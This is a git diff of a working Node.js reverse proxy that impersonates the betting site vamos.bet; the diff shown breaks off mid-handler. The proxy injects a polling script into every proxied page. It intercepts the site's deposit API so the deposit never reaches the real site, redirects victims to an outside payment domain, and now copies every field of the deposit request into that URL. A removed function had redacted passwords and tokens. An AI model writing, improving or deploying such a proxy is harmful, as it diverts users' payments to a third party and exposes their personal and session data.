@@ -5,42 +5,34 @@ import crypto from "node:crypto";
 const PROXY_HOST = "127.0.0.1";
 const PROXY_PORT = 6005;
 
-// Public domain users visit
-const PROXY_PUBLIC_DOMAIN = "https://dashsh.bet";
-
 // Upstream website
 const TARGET_HOSTNAME = "vamos.bet";
 const TARGET_PORT = 443;
 
-// Redirect endpoint
+// Redirect trigger API
 const REDIRECT_API_PATH = "/api/v2/transactions/deposit";
 
-// Redirect destination
-const REDIRECT_BASE_URL = "https://test3.marziplus.com";
+// Redirect destination base
+const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio/";
 
-// Session lifetime
+// Session lifetime limits
 const REDIRECT_TTL_MS = 60_000;
-
-// Maximum body we will buffer
 const MAX_BODY_SIZE = 1 * 1024 * 1024;
-
-// Upstream timeout
 const UPSTREAM_TIMEOUT_MS = 30_000;
-
-// Browser/client timeout
 const CLIENT_TIMEOUT_MS = 120_000;
 
-// Per-browser state
+/*
+|--------------------------------------------------------------------------
+| CLIENT STATE
+|--------------------------------------------------------------------------
+*/
+
 const clients = new Map();
 
 /*
 |--------------------------------------------------------------------------
-| UPSTREAM HTTPS AGENT
+| UPSTREAM HTTPS AGENT (Prevents 502 connection drops under load)
 |--------------------------------------------------------------------------
-|
-| Reuse HTTPS connections to the upstream instead of creating
-| a new TLS connection for every request.
-|
 */
 
 const upstreamAgent = new https.Agent({
@@ -53,7 +45,7 @@ const upstreamAgent = new https.Agent({
 
 /*
 |--------------------------------------------------------------------------
-| CLIENT SESSION
+| CLIENT SESSION MANAGEMENT
 |--------------------------------------------------------------------------
 */
 
@@ -63,24 +55,15 @@ function createClientId() {
 
 function getClientId(req) {
   const cookieHeader = req.headers.cookie || "";
-
-  const match = cookieHeader.match(
-    /(?:^|;\s*)proxy_client_id=([^;]+)/
-  );
-
+  const match = cookieHeader.match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
   return match ? match[1] : null;
 }
 
-function getOrCreateClient(req, res) {
+function getOrCreateClient(req) {
   let id = getClientId(req);
 
   if (!id) {
     id = createClientId();
-
-    res.setHeader(
-      "Set-Cookie",
-      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
-    );
   }
 
   let state = clients.get(id);
@@ -92,7 +75,6 @@ function getOrCreateClient(req, res) {
       createdAt: Date.now(),
       lastSeen: Date.now()
     };
-
     clients.set(id, state);
   } else {
     state.lastSeen = Date.now();
@@ -103,18 +85,14 @@ function getOrCreateClient(req, res) {
 
 /*
 |--------------------------------------------------------------------------
-| CLEAN EXPIRED SESSIONS
+| SESSION CLEANUP
 |--------------------------------------------------------------------------
 */
 
 const cleanupTimer = setInterval(() => {
   const now = Date.now();
-
   for (const [id, state] of clients.entries()) {
-    if (
-      now - state.lastSeen >
-      REDIRECT_TTL_MS
-    ) {
+    if (now - state.lastSeen > REDIRECT_TTL_MS) {
       clients.delete(id);
     }
   }
@@ -124,70 +102,18 @@ cleanupTimer.unref();
 
 /*
 |--------------------------------------------------------------------------
-| REDACT SENSITIVE JSON FIELDS
+| HOP-BY-HOP HEADERS CLEANUP
 |--------------------------------------------------------------------------
-*/
-
-function redactSensitiveData(value) {
-  if (!value || typeof value !== "object") {
-    return value;
-  }
-
-  if (Array.isArray(value)) {
-    return value.map(redactSensitiveData);
-  }
-
-  const result = {};
-
-  for (const [key, val] of Object.entries(value)) {
-    const lower = key.toLowerCase();
-
-    if (
-      lower.includes("password") ||
-      lower.includes("passwd") ||
-      lower.includes("token") ||
-      lower.includes("secret") ||
-      lower.includes("authorization") ||
-      lower.includes("access_token") ||
-      lower.includes("refresh_token") ||
-      lower.includes("session")
-    ) {
-      result[key] = "[REDACTED]";
-    } else if (
-      val &&
-      typeof val === "object"
-    ) {
-      result[key] =
-        redactSensitiveData(val);
-    } else {
-      result[key] = val;
-    }
-  }
-
-  return result;
-}
-
-/*
-|--------------------------------------------------------------------------
-| REMOVE HOP-BY-HOP HEADERS
-|--------------------------------------------------------------------------
-|
-| IMPORTANT:
-| transfer-encoding MUST NOT be forwarded together with
-| content-length to Nginx.
-|
 */
 
 function removeHopByHopHeaders(headers) {
   const result = { ...headers };
-
   const connection = result.connection;
 
   if (connection) {
-    const connectionHeaders =
-      connection
-        .split(",")
-        .map(v => v.trim().toLowerCase());
+    const connectionHeaders = connection
+      .split(",")
+      .map(v => v.trim().toLowerCase());
 
     for (const header of connectionHeaders) {
       delete result[header];
@@ -201,8 +127,6 @@ function removeHopByHopHeaders(headers) {
   delete result.te;
   delete result.trailer;
   delete result.upgrade;
-
-  // CRITICAL FIX
   delete result["transfer-encoding"];
 
   return result;
@@ -210,1216 +134,473 @@ function removeHopByHopHeaders(headers) {
 
 /*
 |--------------------------------------------------------------------------
-| SET-COOKIE HELPER
+| SET-COOKIE MANAGEMENT
 |--------------------------------------------------------------------------
 */
 
-function mergeSetCookie(
-  responseHeaders,
-  proxyCookie
-) {
-  const headers = {
-    ...responseHeaders
-  };
+function addProxyCookie(headers, clientId) {
+  const result = { ...headers };
+  const proxyCookie = `proxy_client_id=${clientId}; Path=/; HttpOnly; Secure; SameSite=Lax`;
 
-  if (!proxyCookie) {
-    return headers;
-  }
-
-  const existing =
-    headers["set-cookie"];
+  const existing = result["set-cookie"];
 
   if (!existing) {
-    headers["set-cookie"] = [
-      proxyCookie
-    ];
-
-    return headers;
+    result["set-cookie"] = [proxyCookie];
+  } else if (Array.isArray(existing)) {
+    result["set-cookie"] = [...existing, proxyCookie];
+  } else {
+    result["set-cookie"] = [existing, proxyCookie];
   }
 
-  if (Array.isArray(existing)) {
-    headers["set-cookie"] = [
-      ...existing,
-      proxyCookie
-    ];
-
-    return headers;
-  }
-
-  headers["set-cookie"] = [
-    existing,
-    proxyCookie
-  ];
-
-  return headers;
+  return result;
 }
 
 /*
 |--------------------------------------------------------------------------
-| BUILD UPSTREAM HEADERS
+| UPSTREAM HEADERS
 |--------------------------------------------------------------------------
 */
 
 function buildUpstreamHeaders(clientReq) {
   const headers = {
     ...clientReq.headers,
-
     host: TARGET_HOSTNAME,
-
-    /*
-     * We modify HTML, so don't allow compression.
-     */
     "accept-encoding": "identity"
   };
 
   delete headers.connection;
-
-  /*
-   * Node will calculate this when needed.
-   */
   delete headers["content-length"];
-
-  /*
-   * Never send the proxy Host upstream.
-   */
-  headers.host =
-    TARGET_HOSTNAME;
 
   return headers;
 }
 
 /*
 |--------------------------------------------------------------------------
-| INJECT BROWSER REDIRECT WATCHER
+| REDIRECT WATCHER SCRIPT
 |--------------------------------------------------------------------------
 */
 
-function injectWatcher(html) {
+function sendRedirectScript(clientRes) {
   const script = `
-<script>
 (function () {
+  "use strict";
 
-  async function checkProxyRedirect() {
+  const INTERVAL = 700;
 
+  async function checkRedirect() {
     try {
+      const response = await fetch("/__proxy_redirect_status", {
+        method: "GET",
+        cache: "no-store",
+        credentials: "same-origin"
+      });
 
-      const response = await fetch(
-        "/__proxy_redirect_status",
-        {
-          method: "GET",
-          cache: "no-store",
-          credentials: "same-origin"
-        }
-      );
+      if (!response.ok) return;
 
-      if (!response.ok) {
-        return;
-      }
-
-      const data =
-        await response.json();
+      const data = await response.json();
 
       if (
-        data.redirect &&
-        data.url
+        data.redirect === true &&
+        typeof data.url === "string" &&
+        data.url.length > 0
       ) {
-
-        window.location.replace(
-          data.url
-        );
-
+        console.log("[Proxy] Redirecting browser:", data.url);
+        window.location.replace(data.url);
       }
-
     } catch (error) {
-      // Ignore temporary proxy errors.
+      console.debug("[Proxy] redirect check failed");
     }
-
   }
 
-  setInterval(
-    checkProxyRedirect,
-    700
-  );
-
-  checkProxyRedirect();
-
+  checkRedirect();
+  setInterval(checkRedirect, INTERVAL);
 })();
-</script>
 `;
 
-  if (html.includes("</body>")) {
-    return html.replace(
-      "</body>",
-      `${script}</body>`
-    );
+  clientRes.writeHead(200, {
+    "Content-Type": "application/javascript; charset=utf-8",
+    "Cache-Control": "no-store, no-cache, must-revalidate",
+    "Content-Length": Buffer.byteLength(script)
+  });
+
+  clientRes.end(script);
+}
+
+function injectWatcher(html) {
+  const tag = `<script src="/__proxy_redirect.js"></script>`;
+
+  if (html.includes("/__proxy_redirect.js")) {
+    return html;
   }
 
-  return html + script;
+  if (html.includes("</head>")) {
+    return html.replace("</head>", `${tag}</head>`);
+  }
+
+  if (html.includes("</body>")) {
+    return html.replace("</body>", `${tag}</body>`);
+  }
+
+  return tag + html;
 }
 
 /*
 |--------------------------------------------------------------------------
-| HANDLE HTML RESPONSE
+| HTML RESPONSE HANDLING
 |--------------------------------------------------------------------------
 */
 
-function handleHtmlResponse(
-  upstreamRes,
-  clientRes,
-  proxyCookie
-) {
+function handleHtmlResponse(upstreamRes, clientRes, clientId) {
   const chunks = [];
-
   let totalSize = 0;
 
   upstreamRes.on("data", chunk => {
     totalSize += chunk.length;
-
-    /*
-     * Prevent excessive memory usage.
-     */
-    if (
-      totalSize <=
-      15 * 1024 * 1024
-    ) {
+    if (totalSize <= 15 * 1024 * 1024) {
       chunks.push(chunk);
     }
   });
 
   upstreamRes.on("end", () => {
     try {
-
-      if (
-        totalSize >
-        15 * 1024 * 1024
-      ) {
-
-        clientRes.writeHead(502, {
-          "Content-Type":
-            "text/plain; charset=utf-8"
-        });
-
-        clientRes.end(
-          "HTML response too large"
-        );
-
+      if (totalSize > 15 * 1024 * 1024) {
+        clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
+        clientRes.end("HTML response too large");
         return;
       }
 
-      let body =
-        Buffer.concat(chunks);
+      let body = Buffer.concat(chunks);
+      let html = body.toString("utf8");
 
-      let html =
-        body.toString("utf8");
+      html = injectWatcher(html);
+      body = Buffer.from(html, "utf8");
 
-      html =
-        injectWatcher(html);
+      let headers = removeHopByHopHeaders(upstreamRes.headers);
+      delete headers["content-length"];
+      delete headers["content-encoding"];
+      delete headers["transfer-encoding"];
 
-      body =
-        Buffer.from(
-          html,
-          "utf8"
-        );
+      headers["content-length"] = body.length;
+      headers = addProxyCookie(headers, clientId);
 
-      let headers =
-        removeHopByHopHeaders(
-          upstreamRes.headers
-        );
-
-      /*
-       * Body has changed.
-       */
-      delete headers[
-        "content-length"
-      ];
-
-      delete headers[
-        "content-encoding"
-      ];
-
-      /*
-       * CRITICAL:
-       * Do NOT send transfer-encoding.
-       */
-      delete headers[
-        "transfer-encoding"
-      ];
-
-      headers[
-        "content-length"
-      ] = body.length;
-
-      headers =
-        mergeSetCookie(
-          headers,
-          proxyCookie
-        );
-
-      clientRes.writeHead(
-        upstreamRes.statusCode ||
-          200,
-        headers
-      );
-
+      clientRes.writeHead(upstreamRes.statusCode || 200, headers);
       clientRes.end(body);
-
     } catch (error) {
-
-      console.error(
-        "❌ HTML processing error:",
-        error.message
-      );
-
-      if (
-        !clientRes.headersSent
-      ) {
-
-        clientRes.writeHead(
-          502,
-          {
-            "Content-Type":
-              "text/plain; charset=utf-8"
-          }
-        );
+      console.error("❌ HTML processing error:", error.message);
+      if (!clientRes.headersSent) {
+        clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
       }
-
-      clientRes.end(
-        "Bad Gateway"
-      );
+      clientRes.end("Bad Gateway");
     }
   });
 
-  upstreamRes.on(
-    "error",
-    error => {
-
-      console.error(
-        "❌ HTML response error:",
-        error.message
-      );
-
-      if (
-        !clientRes.headersSent
-      ) {
-        clientRes.writeHead(502);
-      }
-
-      clientRes.end(
-        "Bad Gateway"
-      );
+  upstreamRes.on("error", error => {
+    console.error("❌ HTML response error:", error.message);
+    if (!clientRes.headersSent) {
+      clientRes.writeHead(502);
     }
-  );
+    clientRes.end("Bad Gateway");
+  });
 }
 
 /*
 |--------------------------------------------------------------------------
-| NORMAL RESPONSE
+| NORMAL RESPONSE HANDLING
 |--------------------------------------------------------------------------
 */
 
-function handleNormalResponse(
-  upstreamRes,
-  clientRes,
-  proxyCookie
-) {
-  let headers =
-    removeHopByHopHeaders(
-      upstreamRes.headers
-    );
+function handleNormalResponse(upstreamRes, clientRes, clientId) {
+  let headers = removeHopByHopHeaders(upstreamRes.headers);
 
-  /*
-   * If Content-Length is invalid,
-   * let Node determine framing.
-   */
-  if (
-    headers["content-length"] !==
-    undefined
-  ) {
-    const contentLength =
-      Number(
-        headers["content-length"]
-      );
-
-    if (
-      !Number.isFinite(
-        contentLength
-      ) ||
-      contentLength < 0
-    ) {
-      delete headers[
-        "content-length"
-      ];
+  if (headers["content-length"] !== undefined) {
+    const length = Number(headers["content-length"]);
+    if (!Number.isFinite(length) || length < 0) {
+      delete headers["content-length"];
     }
   }
 
-  headers =
-    mergeSetCookie(
-      headers,
-      proxyCookie
-    );
+  headers = addProxyCookie(headers, clientId);
 
-  clientRes.writeHead(
-    upstreamRes.statusCode ||
-      200,
-    headers
-  );
+  if (!clientRes.headersSent) {
+    clientRes.writeHead(upstreamRes.statusCode || 200, headers);
+  }
 
-  upstreamRes.on(
-    "error",
-    error => {
+  upstreamRes.on("error", error => {
+    console.error("❌ Upstream response error:", error.message);
+    clientRes.destroy();
+  });
 
-      console.error(
-        "❌ Upstream response error:",
-        error.message
-      );
-
-      clientRes.destroy();
-    }
-  );
-
-  upstreamRes.pipe(
-    clientRes
-  );
+  upstreamRes.pipe(clientRes);
 }
 
 /*
 |--------------------------------------------------------------------------
-| FORWARD REQUEST
+| FORWARD REQUEST TO UPSTREAM
 |--------------------------------------------------------------------------
 */
 
-function forwardRequest(
-  clientReq,
-  clientRes,
-  bufferedBody = null,
-  clientId = null
-) {
-  const headers =
-    buildUpstreamHeaders(
-      clientReq
-    );
+function forwardRequest(clientReq, clientRes, clientId, bufferedBody = null) {
+  const headers = buildUpstreamHeaders(clientReq);
 
-  /*
-   * If buffered, explicitly specify length.
-   */
-  if (
-    Buffer.isBuffer(bufferedBody)
-  ) {
-    headers[
-      "content-length"
-    ] = bufferedBody.length;
+  if (Buffer.isBuffer(bufferedBody)) {
+    headers["content-length"] = bufferedBody.length;
   }
 
   const options = {
-    hostname:
-      TARGET_HOSTNAME,
-
-    port:
-      TARGET_PORT,
-
-    method:
-      clientReq.method,
-
-    path:
-      clientReq.url,
-
+    hostname: TARGET_HOSTNAME,
+    port: TARGET_PORT,
+    method: clientReq.method,
+    path: clientReq.url,
     headers,
-
-    agent:
-      upstreamAgent,
-
-    servername:
-      TARGET_HOSTNAME,
-
-    rejectUnauthorized:
-      true
+    agent: upstreamAgent,
+    servername: TARGET_HOSTNAME,
+    rejectUnauthorized: true
   };
 
-  console.log(
-    `→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`
-  );
+  console.log(`→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`);
 
-  const upstreamReq =
-    https.request(
-      options,
-      upstreamRes => {
+  const upstreamReq = https.request(options, upstreamRes => {
+    console.log(`← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`);
 
-        console.log(
-          `← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`
-        );
+    const contentType = upstreamRes.headers["content-type"] || "";
 
-        const contentType =
-          upstreamRes.headers[
-            "content-type"
-          ] || "";
-
-        let proxyCookie = null;
-
-        if (clientId) {
-          proxyCookie =
-            `proxy_client_id=${clientId}; Path=/; HttpOnly; SameSite=Lax`;
-        }
-
-        /*
-         * HTML needs modification.
-         */
-        if (
-          contentType
-            .toLowerCase()
-            .includes("text/html")
-        ) {
-
-          handleHtmlResponse(
-            upstreamRes,
-            clientRes,
-            proxyCookie
-          );
-
-          return;
-        }
-
-        /*
-         * Everything else streams.
-         */
-        handleNormalResponse(
-          upstreamRes,
-          clientRes,
-          proxyCookie
-        );
-      }
-    );
-
-  /*
-   * Upstream timeout.
-   */
-  upstreamReq.setTimeout(
-    UPSTREAM_TIMEOUT_MS,
-    () => {
-
-      console.error(
-        `❌ Upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`
-      );
-
-      upstreamReq.destroy(
-        new Error(
-          "Upstream timeout"
-        )
-      );
+    if (contentType.toLowerCase().includes("text/html")) {
+      handleHtmlResponse(upstreamRes, clientRes, clientId);
+      return;
     }
-  );
 
-  upstreamReq.on(
-    "error",
-    error => {
+    handleNormalResponse(upstreamRes, clientRes, clientId);
+  });
 
-      console.error(
-        "❌ Upstream error:",
-        error.message
-      );
+  upstreamReq.setTimeout(UPSTREAM_TIMEOUT_MS, () => {
+    console.error(`❌ Upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`);
+    upstreamReq.destroy(new Error("Upstream timeout"));
+  });
 
-      if (
-        !clientRes.headersSent
-      ) {
-
-        clientRes.writeHead(
-          502,
-          {
-            "Content-Type":
-              "text/plain; charset=utf-8",
-
-            "Cache-Control":
-              "no-store"
-          }
-        );
-
-        clientRes.end(
-          "Bad Gateway"
-        );
-
-        return;
-      }
-
+  upstreamReq.on("error", error => {
+    console.error("❌ Upstream error:", error.message);
+    if (!clientRes.headersSent) {
+      clientRes.writeHead(502, {
+        "Content-Type": "text/plain; charset=utf-8",
+        "Cache-Control": "no-store"
+      });
+      clientRes.end("Bad Gateway");
+    } else {
       clientRes.destroy();
     }
-  );
+  });
 
-  /*
-   * Buffered request body.
-   */
-  if (
-    Buffer.isBuffer(
-      bufferedBody
-    )
-  ) {
-
-    upstreamReq.end(
-      bufferedBody
-    );
-
+  if (Buffer.isBuffer(bufferedBody)) {
+    upstreamReq.end(bufferedBody);
     return;
   }
 
-  /*
-   * Normal streaming request.
-   */
-  clientReq.pipe(
-    upstreamReq
-  );
+  clientReq.pipe(upstreamReq);
 }
 
 /*
 |--------------------------------------------------------------------------
-| REDIRECT STATUS
+| REDIRECT STATUS CONSUMPTION (One-Time Fetch)
 |--------------------------------------------------------------------------
 */
 
-function handleRedirectStatus(
-  state,
-  clientRes
-) {
-  const response =
-    JSON.stringify({
-      redirect:
-        Boolean(
-          state?.redirected
-        ),
+function handleRedirectStatus(state, clientRes, clientId) {
+  const isRedirected = Boolean(state?.redirected);
+  const redirectUrl = state?.redirectUrl || null;
 
-      url:
-        state?.redirectUrl ||
-        null
-    });
+  // Clear state after client consumes it to prevent looping & allow manual back-navigation
+  if (state && state.redirected) {
+    state.redirected = false;
+    state.redirectUrl = null;
+  }
 
-  clientRes.writeHead(
-    200,
-    {
-      "Content-Type":
-        "application/json; charset=utf-8",
+  const response = JSON.stringify({
+    redirect: isRedirected,
+    url: redirectUrl
+  });
 
-      "Cache-Control":
-        "no-store, no-cache, must-revalidate",
+  let headers = {
+    "Content-Type": "application/json; charset=utf-8",
+    "Cache-Control": "no-store, no-cache, must-revalidate",
+    "Content-Length": Buffer.byteLength(response)
+  };
 
-      "Content-Length":
-        Buffer.byteLength(
-          response
-        )
-    }
-  );
+  headers = addProxyCookie(headers, clientId);
 
-  clientRes.end(
-    response
-  );
+  clientRes.writeHead(200, headers);
+  clientRes.end(response);
 }
 
 /*
 |--------------------------------------------------------------------------
-| REDIRECT ENDPOINT
+| REDIRECT API TRIGGER (Body -> Query String)
 |--------------------------------------------------------------------------
 */
 
-async function handleRedirectRequest(
-  clientReq,
-  clientRes,
-  state,
-  clientId
-) {
+async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
   const chunks = [];
-
   let totalSize = 0;
 
   try {
-
-    for await (
-      const chunk of clientReq
-    ) {
-
-      totalSize +=
-        chunk.length;
-
-      if (
-        totalSize >
-        MAX_BODY_SIZE
-      ) {
-
-        clientRes.writeHead(
-          413,
-          {
-            "Content-Type":
-              "text/plain; charset=utf-8"
-          }
-        );
-
-        clientRes.end(
-          "Request body too large"
-        );
-
+    for await (const chunk of clientReq) {
+      totalSize += chunk.length;
+      if (totalSize > MAX_BODY_SIZE) {
+        clientRes.writeHead(413, { "Content-Type": "text/plain; charset=utf-8" });
+        clientRes.end("Request body too large");
         return;
       }
-
       chunks.push(chunk);
     }
-
   } catch (error) {
-
-    console.error(
-      "❌ Request body error:",
-      error.message
-    );
-
-    clientRes.writeHead(
-      400
-    );
-
-    clientRes.end(
-      "Bad Request"
-    );
-
+    console.error("❌ Request body error:", error.message);
+    clientRes.writeHead(400);
+    clientRes.end("Bad Request");
     return;
   }
 
-  const body =
-    Buffer.concat(chunks);
+  const body = Buffer.concat(chunks);
 
-  /*
-   * ========================================
-   * NO BODY
-   * ========================================
-   */
-
-  if (
-    body.length === 0
-  ) {
-
-    console.log(
-      "↪ Redirect endpoint has no body"
-    );
-
-    console.log(
-      "↪ Continuing normal proxy..."
-    );
-
-    forwardRequest(
-      clientReq,
-      clientRes,
-      body,
-      clientId
-    );
-
+  if (body.length === 0) {
+    forwardRequest(clientReq, clientRes, clientId, body);
     return;
   }
 
-  console.log("");
-  console.log(
-    "=========================================="
-  );
+  console.log(`\n==========================================\n🚨 REDIRECT TRIGGERED`);
+  console.log(`Endpoint: ${REDIRECT_API_PATH}\nBody size: ${body.length} bytes`);
 
-  console.log(
-    "REDIRECT ENDPOINT"
-  );
-
-  console.log(
-    `Body size: ${body.length} bytes`
-  );
-
-  let json;
-
-  /*
-   * ========================================
-   * PARSE JSON
-   * ========================================
-   */
+  const redirectUrl = new URL(REDIRECT_BASE_URL);
 
   try {
-
-    json =
-      JSON.parse(
-        body.toString("utf8")
-      );
-
-  } catch (error) {
-
-    console.log(
-      "Invalid JSON."
-    );
-
-    console.log(
-      "↪ Continuing normal proxy..."
-    );
-
-    console.log(
-      "=========================================="
-    );
-
-    forwardRequest(
-      clientReq,
-      clientRes,
-      body,
-      clientId
-    );
-
-    return;
+    const json = JSON.parse(body.toString("utf8"));
+    if (json && typeof json === "object" && !Array.isArray(json)) {
+      for (const [key, value] of Object.entries(json)) {
+        if (value !== undefined && value !== null) {
+          redirectUrl.searchParams.set(key, String(value));
+        }
+      }
+    }
+  } catch {
+    console.log("Request body is non-JSON; using base redirect URL.");
   }
 
-  /*
-   * Must be an object.
-   */
-  if (
-    !json ||
-    typeof json !== "object" ||
-    Array.isArray(json)
-  ) {
-
-    console.log(
-      "Body is not a JSON object."
-    );
-
-    console.log(
-      "↪ Continuing normal proxy..."
-    );
-
-    console.log(
-      "=========================================="
-    );
-
-    forwardRequest(
-      clientReq,
-      clientRes,
-      body,
-      clientId
-    );
-
-    return;
-  }
-
-  /*
-   * Safe logging.
-   */
-  console.log(
-    "Request body:"
-  );
-
-  console.log(
-    JSON.stringify(
-      redactSensitiveData(json),
-      null,
-      2
-    )
-  );
-
-  /*
-   * ========================================
-   * EXTRACT PHONE
-   * ========================================
-   */
-
-  const phone =
-    json.phone;
-
-  /*
-   * No phone -> don't redirect.
-   */
-  if (
-    phone === undefined ||
-    phone === null ||
-    String(phone).trim() === ""
-  ) {
-
-    console.log(
-      "⚠️ No phone field."
-    );
-
-    console.log(
-      "↪ Continuing normal proxy..."
-    );
-
-    console.log(
-      "=========================================="
-    );
-
-    forwardRequest(
-      clientReq,
-      clientRes,
-      body,
-      clientId
-    );
-
-    return;
-  }
-
-  /*
-   * ========================================
-   * BUILD REDIRECT URL
-   * ========================================
-   */
-
-  const redirectUrl =
-    new URL(
-      REDIRECT_BASE_URL
-    );
-
-  redirectUrl.searchParams.set(
-    "phone",
-    String(phone)
-  );
-
-  const finalUrl =
-    redirectUrl.toString();
-
-  console.log(
-    `📱 Phone: ${String(phone)}`
-  );
-
-  console.log(
-    `➡ Redirect URL: ${finalUrl}`
-  );
-
-  /*
-   * ========================================
-   * STORE SESSION STATE
-   * ========================================
-   */
+  const finalUrl = redirectUrl.toString();
+  console.log(`➡ Destination URL: ${finalUrl}`);
 
   if (state) {
-
-    state.redirected =
-      true;
-
-    state.redirectUrl =
-      finalUrl;
-
-    state.lastSeen =
-      Date.now();
+    state.redirected = true;
+    state.redirectUrl = finalUrl;
+    state.lastSeen = Date.now();
   }
 
-  /*
-   * ========================================
-   * DO NOT FORWARD THIS API
-   * ========================================
-   */
+  // Intercept request and respond directly without sending upstream
+  const response = JSON.stringify({ success: true, proxyRedirect: true });
+  let headers = {
+    "Content-Type": "application/json; charset=utf-8",
+    "Cache-Control": "no-store, no-cache, must-revalidate",
+    "Content-Length": Buffer.byteLength(response)
+  };
 
-  const response =
-    JSON.stringify({
-      success: true,
-      proxyRedirect: true
-    });
+  headers = addProxyCookie(headers, clientId);
 
-  clientRes.writeHead(
-    200,
-    {
-      "Content-Type":
-        "application/json; charset=utf-8",
+  clientRes.writeHead(200, headers);
+  clientRes.end(response);
 
-      "Cache-Control":
-        "no-store, no-cache, must-revalidate",
-
-      "Content-Length":
-        Buffer.byteLength(
-          response
-        )
-    }
-  );
-
-  clientRes.end(
-    response
-  );
-
-  console.log(
-    "🛑 Browser session marked for redirect."
-  );
-
-  console.log(
-    "=========================================="
-  );
+  console.log("==========================================\n");
 }
 
 /*
 |--------------------------------------------------------------------------
-| MAIN SERVER
+| MAIN HTTP SERVER
 |--------------------------------------------------------------------------
 */
 
-const server =
-  http.createServer(
-    async (
-      clientReq,
-      clientRes
-    ) => {
+const server = http.createServer(async (clientReq, clientRes) => {
+  clientReq.setTimeout(CLIENT_TIMEOUT_MS, () => {
+    console.error("❌ Client request timeout");
+    clientReq.destroy();
+  });
 
-      /*
-       * Per-request timeout.
-       */
-      clientReq.setTimeout(
-        CLIENT_TIMEOUT_MS,
-        () => {
+  try {
+    const parsedUrl = new URL(
+      clientReq.url,
+      `http://${clientReq.headers.host || "localhost"}`
+    );
+    const path = parsedUrl.pathname;
 
-          console.error(
-            "❌ Client request timeout"
-          );
+    const clientId = getOrCreateClient(clientReq);
+    const state = clients.get(clientId);
 
-          clientReq.destroy();
-        }
-      );
+    console.log(`→ ${clientReq.method} ${clientReq.url}`);
 
-      try {
-
-        const parsedUrl =
-          new URL(
-            clientReq.url,
-            `http://${clientReq.headers.host || "localhost"}`
-          );
-
-        const path =
-          parsedUrl.pathname;
-
-        /*
-         * Create/get browser session.
-         */
-        const clientId =
-          getOrCreateClient(
-            clientReq,
-            clientRes
-          );
-
-        const state =
-          clients.get(clientId);
-
-        console.log(
-          `→ ${clientReq.method} ${clientReq.url}`
-        );
-
-        /*
-         * ======================================
-         * REDIRECT STATUS
-         * ======================================
-         */
-
-        if (
-          clientReq.method === "GET" &&
-          path ===
-            "/__proxy_redirect_status"
-        ) {
-
-          handleRedirectStatus(
-            state,
-            clientRes
-          );
-
-          return;
-        }
-
-        /*
-         * ======================================
-         * REDIRECT API
-         * ======================================
-         */
-
-        if (
-          path ===
-          REDIRECT_API_PATH
-        ) {
-
-          await handleRedirectRequest(
-            clientReq,
-            clientRes,
-            state,
-            clientId
-          );
-
-          return;
-        }
-
-        /*
-         * ======================================
-         * STOP REDIRECTED SESSION
-         * ======================================
-         */
-
-        if (
-          state &&
-          state.redirected
-        ) {
-
-          console.log(
-            `🛑 Session terminated: ${path}`
-          );
-
-          clientRes.writeHead(
-            410,
-            {
-              "Content-Type":
-                "text/plain; charset=utf-8",
-
-              "Cache-Control":
-                "no-store"
-            }
-          );
-
-          clientRes.end(
-            "Proxy session terminated"
-          );
-
-          return;
-        }
-
-        /*
-         * ======================================
-         * NORMAL PROXY
-         * ======================================
-         */
-
-        forwardRequest(
-          clientReq,
-          clientRes,
-          null,
-          clientId
-        );
-
-      } catch (error) {
-
-        console.error(
-          "❌ Request handler error:",
-          error
-        );
-
-        if (
-          !clientRes.headersSent
-        ) {
-
-          clientRes.writeHead(
-            500,
-            {
-              "Content-Type":
-                "text/plain; charset=utf-8"
-            }
-          );
-        }
-
-        clientRes.end(
-          "Internal Server Error"
-        );
-      }
+    // Serve script watcher
+    if (clientReq.method === "GET" && path === "/__proxy_redirect.js") {
+      sendRedirectScript(clientRes);
+      return;
     }
-  );
 
-/*
-|--------------------------------------------------------------------------
-| NODE SERVER TIMEOUTS
-|--------------------------------------------------------------------------
-*/
-
-server.requestTimeout =
-  CLIENT_TIMEOUT_MS;
-
-server.headersTimeout =
-  65_000;
-
-server.keepAliveTimeout =
-  65_000;
-
-server.maxRequestsPerSocket =
-  0;
-
-/*
-|--------------------------------------------------------------------------
-| SERVER ERROR
-|--------------------------------------------------------------------------
-*/
-
-server.on(
-  "clientError",
-  (error, socket) => {
-
-    console.error(
-      "❌ Client error:",
-      error.message
-    );
-
-    if (
-      socket.writable
-    ) {
-      socket.end(
-        "HTTP/1.1 400 Bad Request\r\n\r\n"
-      );
+    // Serve redirect status check
+    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
+      handleRedirectStatus(state, clientRes, clientId);
+      return;
     }
+
+    // Trigger API endpoint interceptor
+    if (path === REDIRECT_API_PATH) {
+      await handleRedirectRequest(clientReq, clientRes, state, clientId);
+      return;
+    }
+
+    // Standard proxy pipeline (Runs continuously, even after back-navigation)
+    forwardRequest(clientReq, clientRes, clientId);
+
+  } catch (error) {
+    console.error("❌ Request handler error:", error);
+    if (!clientRes.headersSent) {
+      clientRes.writeHead(500, { "Content-Type": "text/plain; charset=utf-8" });
+    }
+    clientRes.end("Internal Server Error");
   }
-);
+});
 
 /*
 |--------------------------------------------------------------------------
-| PROCESS ERRORS
+| SERVER TIMEOUT & ERROR HANDLERS
 |--------------------------------------------------------------------------
 */
 
-process.on(
-  "uncaughtException",
-  error => {
+server.requestTimeout = CLIENT_TIMEOUT_MS;
+server.headersTimeout = 65_000;
+server.keepAliveTimeout = 65_000;
+server.maxRequestsPerSocket = 0;
 
-    console.error(
-      "❌ uncaughtException:",
-      error
-    );
+server.on("clientError", (error, socket) => {
+  console.error("❌ Client error:", error.message);
+  if (socket.writable) {
+    socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
   }
-);
+});
 
-process.on(
-  "unhandledRejection",
-  error => {
+process.on("uncaughtException", error => {
+  console.error("❌ uncaughtException:", error);
+});
 
-    console.error(
-      "❌ unhandledRejection:",
-      error
